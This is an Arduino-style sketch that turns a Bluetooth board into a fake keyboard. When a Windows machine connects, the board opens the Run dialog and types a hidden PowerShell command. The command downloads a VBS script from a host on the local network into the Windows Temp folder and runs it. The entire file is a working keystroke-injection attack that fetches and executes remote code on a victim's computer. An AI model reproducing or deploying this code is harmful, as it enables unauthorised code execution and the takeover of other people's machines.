#include <BleKeyboard.h>

const char  * payload[] = {
    "powershell -windowstyle hidden -command ",
    "$url = 'http://192.168.100.22/README.vbs';",
    "$output = 'C:\\Windows\\Temp\\log.vbs';", 
    "Invoke-WebRequest -Uri $url -OutFile $output;", 
    "cmd /c 'C:\\Windows\\Temp\\log.vbs';",
};
     

BleKeyboard ble;

void setup() {
  ble.begin();
}

void injectPayload(){
  for(int i = 0; 5 > i; i++){
    ble.print(payload[i]);
    delay(5);
  }
  ble.write(KEY_RETURN);
}

void launchRunMacro(){
    ble.press(KEY_LEFT_GUI);
    ble.print("r");
    ble.releaseAll();
}

void loop() {
  if(ble.isConnected()){
    launchRunMacro();
    injectPayload();
    delay(1000);
  }
  delay(100);
}
